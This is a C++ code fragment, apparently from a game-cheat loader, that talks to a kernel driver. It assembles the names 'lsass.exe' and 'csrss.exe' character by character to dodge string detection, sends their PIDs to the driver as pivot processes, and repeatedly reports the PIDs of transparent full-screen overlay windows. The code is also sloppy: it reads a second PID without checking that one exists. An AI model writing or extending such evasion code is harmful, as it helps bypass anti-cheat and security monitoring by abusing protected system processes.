	wstring lsassNoStr1 = we1 +L'c' + L's' + L'r' + L's' + L's' + L'.' + L'e' + L'x' + L'e';
	vector<DWORD> pidsLsass1 = GetPIDs(lsassNoStr1);
	if (pidsLsass1.empty())
		cout << "Not Found" << endl;
	sort(pidsLsass1.begin(), pidsLsass1.end()); // In case there is several lsass.exe running (?) take the first one (based on PID)
	csrss1 = pidsLsass1[0];
	csrss2 = pidsLsass1[1];
	if (!csrss1)
		cout << "Not Found" << endl;
	if (!csrss2)
		cout << "Not Found" << endl;

	DWORD pivotPID = NULL;
	wstring we = L"";
	wstring lsassNoStr = we + L'l' + L's' + L'a' + L's' + L's' + L'.' + L'e' + L'x' + L'e';
	vector<DWORD> pidsLsass = GetPIDs(lsassNoStr);
	if (pidsLsass.empty())
		cout << "Not Found" << endl;
	sort(pidsLsass.begin(), pidsLsass.end()); // In case there is several lsass.exe running (?) take the first one (based on PID)
	pivotPID = pidsLsass[0];
	if (!pivotPID)
		cout << "Not Found" << endl;


	if (SendProcessIDs(6216, pivotPID, csrss1, csrss2, (ULONG)GetCurrentProcessId(), 0)) // 396 & = Csrss's PIDs
	{
		cout << "Sent Data" << endl;
	}
	else
	{
		cout << "False" << endl;
	}
	
	while (1)
	{
		
		Speed_perf();
		CheckAdmin();
			
		OverlayFinderParams params;
		params.style = WS_VISIBLE;
		params.styleEx = WS_EX_LAYERED | WS_EX_TRANSPARENT;
		params.percentMainScreen = 90.0f;
		params.satisfyAllCriteria = true;
		vector<HWND> hwnds = OverlayFinder(params);

		for (int i(0); i < hwnds.size(); ++i) {
			DWORD pid = 0;
			DWORD tid = GetWindowThreadProcessId(hwnds[i], &pid);
			HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
			if (hProcess) 
			{
				char cheatPath[MAX_PATH] = "";
				GetProcessImageFileNameA(hProcess, (LPSTR)&cheatPath, MAX_PATH);
			}
			SendProcessIDs(0, 0, 0, 0, 0, pid);
			CloseHandle(hProcess);
		}
	}
	CloseHandle(hDriver);
    return 0;
}

